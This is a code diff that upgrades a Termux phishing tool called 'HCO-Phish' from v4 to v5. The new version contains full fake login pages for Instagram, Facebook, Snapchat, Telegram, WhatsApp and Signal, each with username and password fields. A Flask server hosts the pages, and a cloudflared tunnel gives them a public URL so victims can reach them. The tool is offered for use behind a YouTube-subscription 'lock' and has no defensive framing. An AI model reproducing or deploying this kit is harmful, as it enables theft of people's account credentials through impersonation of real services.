@@ -1,15 +1,14 @@
 #!/usr/bin/env python3
-# HCO-Phish v4 – Single File Termux Tool
-# Colored menu, tool lock, YouTube redirect with countdown, Flask server, auto Cloudflared public URL
+# HCO-Phish v5 – Single File Termux Tool
+# Full version with all services, auto Cloudflared, tool lock, YouTube redirect, countdown
 
-import os, sys, time, subprocess, shutil
+import os, sys, time, subprocess, shutil, threading, re
 from colorama import Fore, Style, init
 from flask import Flask, render_template_string, request
-import threading, re
 
 init(autoreset=True)
 
-# ------------------ Tool Lock & YouTube Redirect with Countdown ------------------ #
+# ------------------ Tool Lock & YouTube Redirect ------------------ #
 def check_subscription():
     print(Fore.RED + "\n🔒 Tool is locked! Subscribe to unlock.\n")
     print(Fore.YELLOW + "Redirecting to Hackers Colony YouTube channel in:")
@@ -58,20 +57,113 @@ services = {
 selected_service = services[choice]
 print(Fore.LIGHTMAGENTA_EX + f"[*] You selected: {selected_service}")
 
-# ------------------ Tool Lock Check ------------------ #
+# ------------------ Tool Lock ------------------ #
 check_subscription()
 print(Fore.CYAN + "[*] Starting local Flask server...")
 
 # ------------------ Flask App ------------------ #
 app = Flask(__name__)
 
+# ------------------ HTML Templates ------------------ #
 templates = {
-    "Instagram": """<html>...Instagram HTML code here...</html>""",
-    "Facebook": """<html>...Facebook HTML code here...</html>""",
-    "Snapchat": """<html>...Snapchat HTML code here...</html>""",
-    "Telegram": """<html>...Telegram HTML code here...</html>""",
-    "Whatsapp": """<html>...Whatsapp HTML code here...</html>""",
-    "Signal": """<html>...Signal HTML code here...</html>"""
+"Instagram": """
+<html><head><title>Instagram Login</title>
+<style>
+body{background:#1c1c1c;color:#fff;font-family:Arial;text-align:center;}
+input{padding:10px;margin:5px;width:250px;border-radius:5px;border:none;}
+button{padding:10px 20px;margin-top:10px;background:#405DE6;color:white;border:none;border-radius:5px;cursor:pointer;}
+h1{color:#f06292;}
+</style></head>
+<body>
+<h1>Instagram Login</h1>
+<form method="POST">
+<input type="text" name="username" placeholder="Username" required><br>
+<input type="password" name="password" placeholder="Password" required><br>
+<button type="submit">Login</button>
+</form>
+</body></html>
+""",
+"Facebook": """
+<html><head><title>Facebook Login</title>
+<style>
+body{background:#1877f2;color:white;font-family:Arial;text-align:center;}
+input{padding:10px;margin:5px;width:250px;border-radius:5px;border:none;}
+button{padding:10px 20px;margin-top:10px;background:#42b72a;color:white;border:none;border-radius:5px;cursor:pointer;}
+h1{color:#fff;}
+</style></head>
+<body>
+<h1>Facebook Login</h1>
+<form method="POST">
+<input type="text" name="username" placeholder="Email or Phone" required><br>
+<input type="password" name="password" placeholder="Password" required><br>
+<button type="submit">Login</button>
+</form>
+</body></html>
+""",
+"Snapchat": """
+<html><head><title>Snapchat Login</title>
+<style>
+body{background:#fffc00;color:#000;font-family:Arial;text-align:center;}
+input,button{padding:10px;margin:5px;}
+h1{color:#000;}
+</style></head>
+<body>
+<h1>Snapchat Login</h1>
+<form method="POST">
+<input type="text" name="username" placeholder="Username" required><br>
+<input type="password" name="password" placeholder="Password" required><br>
+<button type="submit">Login</button>
+</form>
+</body></html>
+""",
+"Telegram": """
+<html><head><title>Telegram Login</title>
+<style>
+body{background:#0088cc;color:white;font-family:Arial;text-align:center;}
+input,button{padding:10px;margin:5px;}
+h1{color:white;}
+</style></head>
+<body>
+<h1>Telegram Login</h1>
+<form method="POST">
+<input type="text" name="username" placeholder="Phone Number" required><br>
+<input type="password" name="password" placeholder="Password" required><br>
+<button type="submit">Login</button>
+</form>
+</body></html>
+""",
+"Whatsapp": """
+<html><head><title>Whatsapp Login</title>
+<style>
+body{background:#25d366;color:white;font-family:Arial;text-align:center;}
+input,button{padding:10px;margin:5px;}
+h1{color:white;}
+</style></head>
+<body>
+<h1>Whatsapp Login</h1>
+<form method="POST">
+<input type="text" name="username" placeholder="Phone Number" required><br>
+<input type="password" name="password" placeholder="Password" required><br>
+<button type="submit">Login</button>
+</form>
+</body></html>
+""",
+"Signal": """
+<html><head><title>Signal Login</title>
+<style>
+body{background:#3a76f0;color:white;font-family:Arial;text-align:center;}
+input,button{padding:10px;margin:5px;}
+h1{color:white;}
+</style></head>
+<body>
+<h1>Signal Login</h1>
+<form method="POST">
+<input type="text" name="username" placeholder="Phone Number" required><br>
+<input type="password" name="password" placeholder="Password" required><br>
+<button type="submit">Login</button>
+</form>
+</body></html>
+"""
 }
 
 @app.route(f"/simulate/{selected_service.lower()}", methods=["GET","POST"])
@@ -89,9 +181,7 @@ def start_cloudflared():
     cloudflared_path = shutil.which("cloudflared")
     if cloudflared_path:
         print(Fore.CYAN + "[*] Starting cloudflared tunnel...")
-        # Start cloudflared in background
         proc = subprocess.Popen([cloudflared_path, "tunnel", "--url", "http://127.0.0.1:5000"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-        # Wait a few seconds and capture public URL from output
         public_url = None
         timeout = 20
         start = time.time()
@@ -109,7 +199,7 @@ def start_cloudflared():
     else:
         print(Fore.YELLOW + "[!] Cloudflared not installed. Skipping public URL...")
 
-# Start cloudflared in a separate thread so Flask still runs
+# Start Cloudflared in background
 threading.Thread(target=start_cloudflared, daemon=True).start()
 
 # ------------------ Run Flask ------------------ #
